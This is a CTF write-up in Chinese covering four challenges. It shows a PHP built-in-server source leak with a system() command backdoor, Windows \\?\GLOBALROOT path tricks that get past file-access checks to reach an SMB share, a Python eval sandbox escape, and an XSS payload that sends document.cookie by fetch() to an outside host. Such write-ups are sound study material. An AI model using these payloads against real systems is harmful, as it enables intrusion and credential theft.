## keep
通过`php -S`开起的内置WEB服务器存在源码泄露漏洞，可以将PHP文件作为静态文件直接输出源码
例题
litctf keep
![](/image/325.png)
通过404界面可以看到是由`php -S`开启的WEB服务。
所以就抓包
![](/image/326.png)
就可以读出源码。
这里注意一定要换行，并且把自动更新Content-length关掉。
index.php一定是存在的文件才可以读。
下面的111.txt是不存在的文件，这里不可以写无后缀文件和.php后缀文件，这样的路由会被当成php解析。
再
```
GET /s3Cr37_f1L3.php.bak HTTP/1.1
Host: 61.147.171.105:59897

POST /ra.php HTTP/1.1
Host: 61.147.171.105:59897
Content-Type: application/x-www-form-urlencoded
Content-Length: 117

admin=%73%79%73%74%65%6d%28%27%63%61%74%20%2f%66%6c%61%67%5f%38%33%66%65%34%32%65%66%64%66%35%34%64%35%38%32%27%29%3b
```
就得到flag了。
![](/image/332.png)
Content-Length要计算正确，不然会失败。ra.php是瞎写的，不存在，只有写一个php后缀的文件，他才会当成php去解析。这和刚才读源码道理一样，写111.txt也是为了把他当作txt文件解析，直接回显源码。这样那个后门被当作php解析，就可以了。（如果POST请求里有空格，要把整体url编码一下）
## PATH
参考文章
https://www.freebuf.com/articles/endpoint/342823.html
根据/api/info的提示‘
```
{"data":{"challenge":"Path Maze","hints":["Stage 1: Find and read the access token from the system","Stage 2: Use the token to access the backup server","Token location: C:\\token\\access_key.txt","Backup server: 172.20.0.10","Backup server SMB Share name: backup","Flag file: flag.txt"],"stages":2,"version":"1.0.0"},"success":true}
```
先要访问`/api/diag/read`来读取系统文件，得到token
但是直接
```
?path=C:\\token\\access_key.txt
```
是不行的，`{"error":"Path validation failed: Path not in allowed directory","success":false}`说明这是不可以的。
但是如果
```
?path=\\?\C:\token\access_key.txt
```
就可以成功执行。
这是因为题目用的是WIN32规则校验路径。如果输入`C:\\token\\access_key.txt`他会匹配win32校验，而被拦截。如果`\\?\C:\token\access_key.txt`不会触发win32校验，但是windows也可以识别这个路径。
得到token后访问`/api/export/read`
读取文件直接读取也是不行的。因为要访问的是远程文件系统，所以要用到UNC路径。
```
?path=\\?\GLOBALROOT\??\UNC\172.20.0.10\backup\flag.txt&token=pESBi0juleYfu3bO7Stw_7xL0yLErdwNGhwjDCmgluI
```
得到flag。
如果
```
?path=\\?\UNC\172.20.0.10\backup\flag.txt&token=Qjt7Hnj9MxIRVgug9PkdM6Qn7lBD2WwHFOjWumPZEyo
```
回显
Path validation failed: UNC path not allowed，因为这样会识别成UNC路径。
但是
`\\?\GLOBALROOT`开头就会直接从`\GLOBALROOT`开始走，就用 Win32 的 DosDevices 了。`\??\UNC\`是UNC的真实入口，等价于`\Device\Mup\`，即使用`\\?\UNC\`也会转成`\??\UNC\`，这样就绕过UNC的校验了。
## CheckIn
dirsearch可以扫到源码
```python
#Python 3.14.2
import re
from collections import UserList
from sys import argv

class LockedList(UserList):
    def __setitem__(self, key, value):
        raise Exception("Assignment blocked!")

def sandbox():
    if len(argv) != 2:
        print("ERROR: Missing code")
        return

    try:
        status = LockedList([False])
        status_id = id(status)
        user_input = argv[1].encode('idna').decode('ascii').rstrip('-')

        if re.search(r'[0-9A-Z]', user_input):
            print("FORBIDDEN: No numbers or alphas")
            return

        if re.search(r'[_\s=+\[\],"\'\<\>\-\*@#$%^&\\\|\{\}\:;]', user_input):
            print("FORBIDDEN: Incorrect symbol detected")
            return

        if re.search(r'(status|flag|update|setattr|getattr|eval|exec|import|locals|os|sys|builtins|open|or|and|not|is|breakpoint|exit|print|quit|help|input|globals)', user_input.casefold()):
            print("FORBIDDEN: Keywords detected")
            return

        if len(user_input) > 60:
            print("FORBIDDEN: Input too long! Keep it concise and it is very simple.")
            return

        eval(user_input)
        
        if status[0] and id(status) == status_id:
            with open('/flag', 'r') as f:
                flag = f.read().strip()
                print(f"SUCCESS! Flag: {flag}")
        else:
            print(f"FAILURE: status is still {status}")
            
    except Exception as e:
        print(f"Don't be evil~ And I won't show you this error :)")

if __name__ == '__main__':
    sandbox()
```
过滤了数字大写字母，过滤了许多符号，还过滤了`flag/status/update...`等关键字，
`user_input = argv[1].encode('idna').decode('ascii').rstrip('-')`先用idna编码，再用ascii解码，确保最后进入eval的是ascii字符串。
（这一步是为了防止用户输入`ⒶⒷⒸⒹⒺⒻⒼ`这类字符绕过正则检测）
长度还必须<=60。
拿到flag的要求
```python
if status[0] and id(status) == status_id:
    with open('/flag', 'r') as f:
        flag = f.read().strip()
        print(f"SUCCESS! Flag: {flag}")
else:
    print(f"FAILURE: status is still {status}")
```
`status[0]`要存在，`status_id`不变。
可以用源码在本地调试。
如果在try里面加一个`print(dir())`可以打印出`['status', 'status_id', 'user_input']`再`print(min(dir()))`就可以拿到`status`。
```
dir() 是 Python 内置函数，无参数调用时，返回当前作用域中所有已定义的名称列表（包含变量、函数、类、内置属性 / 方法等），默认会包含 Python 为作用域预定义的特殊属性（以双下划线`__`开头和结尾的名称，也常被称为 “魔术属性”）。
min() 函数用于获取可迭代对象中的最小值，对字符串进行比较时，遵循 Python 的Unicode 编码字典序 （本质是比较字符的 Unicode 编码值大小）。
同一位置的两个字符，直接比较其 Unicode 编码值，若某一位置字符不同，立即根据该位置的大小判定整个字符串的大小，后续字符不再比较；
若一个字符串是另一个的前缀（如 'app' 和 'apple'），则更短的字符串更小。
```
根据这个规则`min(dir())`得到status。
`print(vars())`可以返回包含了当前所有的变量名和它们对应的对象。
```
{'status': [False], 'status_id': 1954136456832, 'user_input': '66'
```
这样就可以利用get取到status
```
vars().get(min(dir())).pop()
```
可以得到0。因为status的状态伪False。
`pop()`核心作用是移除序列中指定位置的元素，并返回该被移除的元素，如果不传参数，默认移除并弹出最后一个。
因为`vars().get(min(dir()))`是关于对象的索引，所以`.pop()`就把status的False删除了。
这样做是因为
```python
class LockedList(UserList):
    def __setitem__(self, key, value):
        raise Exception("Assignment blocked!")
status = LockedList([False])
```
这样做就禁止了通过索引值修改status。但是可以通过pop修改，pop删除了False，并弹出False，也就是0。
因为没有过滤`~`所以可以进行取反运算，这个取反运算是针对pop弹出的结果False的，因为运算符的优先级低于方法调用，这样也可以省出两个括号。
`~0 == -(0+1) == -1`所有非零数字都是True，这样就可以得到True。
再用`append`把pop挖出的坑用True填上。
```
append(~vars().get(min(dir())).pop())
```
前面还要用`vars().get(min(dir()))`再拿到`status`对status填坑。
最终payload
```
vars().get(min(dir())).append(~vars().get(min(dir())).pop())
```
长度刚好60。
**还有一种解法**：就是如果不知道源码怎么办
先fuzz一下哪些被过滤了。
输入
```
copyright()
```
回显
```
Copyright (c) 2001-2023 Python Software Foundation.
All Rights Reserved.

Copyright (c) 2000 BeOpen.com.
All Rights Reserved.

Copyright (c) 1995-2001 Corporation for National Research Initiatives.
All Rights Reserved.

Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam.
All Rights Reserved.
FAILURE: status is still [False]
```
说明是可以有回显的。
输入
```
next(iter(vars().values())).append(vars())
```
回显
```
FAILURE: status is still [False, {'status': [...], 'status_id': 2088150761088, 'user_input': 'next(iter(vars().values())).append(vars())'}]
```
把vars()的结果拼接到status上。这样不用源码就可以知道`var()`
接下来就用刚才的payload就可以了。
也可以进一步缩短长度
```
₨ 这个字符经过
print('₨'.encode('idna').decode('ascii').rstrip('-'))
会变成rs，这样就又可以节约两个字符，
payload
va₨().get(min(dir())).append(~va₨().get(min(dir())).pop())
```

## playground
这个是一个XSS漏洞，界面是执行python代码。
这里要用到一个compile()函数
```
compile(source, filename, mode, flags=0, dont_inherit=False)
```
其中`source, filename, mode`是必须填的。
`source`是待编译的python代码，例如`print('123')`
`filename`是代码的「来源标识」，仅用于**报错时定位文件名**；
`mode`编译模式，
`mode='exec'`编译无返回值的语句 / 代码块（如赋值语句、打印、循环、条件判断、函数 / 类定义等），支持单行 / 多行代码；
`mode='eval'` 执行有返回值的单个表达式,编译**单个合法的 Python 表达式**（如 `1+2`、`"abc".upper()`、`[x for x in range(3)]` 等），**不能包含语句**（如赋值、print、if 等）；
`mode='single'`编译**交互式环境的单行代码**（如终端输入的一行命令，支持语句 / 表达式）；
前端源码里有一句
```js
try { $ret=susp.child.resume(); } catch(err) { if (!(err instanceof Sk.builtin.BaseException)) { err = new Sk.builtin.ExternalError(err); } err.traceback.push({lineno: $currLineNo, colno: $currColNo, filename: '" + this.filename + "'}); if($exc.length>0) { $err=err; $blk=$exc.pop(); } else { throw err; } }};
```
这里的filename没有经过任何转义处理直接拼接，但这是只有报错才出现的，可以人为制造报错
所以可以拼接，
```js
evil = compile(
    "1/0",
    "'+(fetch(`http://is6u5fuy.requestrepo.com/?c=`+encodeURIComponent(document.cookie)),'')+'",
    "exec"
)
exec(evil)
```
这里的`1/0`会报错，这样拼接后源码变成了
```js
try { 
	$ret=susp.child.resume(); 
	} 
	catch(err) { 
		if (!(err instanceof Sk.builtin.BaseException)) { 
			err = new Sk.builtin.ExternalError(err); 
			} 
			err.traceback.push({lineno: $currLineNo, colno: $currColNo, filename: ''+(fetch(`http://x.x.x.x:x/?c=`+encodeURIComponent(document.cookie)),'')+''}); if($exc.length>0) { $err=err; $blk=$exc.pop(); } else { throw err; } }};
```
这样前后刚好完成拼接没有语法错误。
发送后bot就会自动触发。
## Naliong



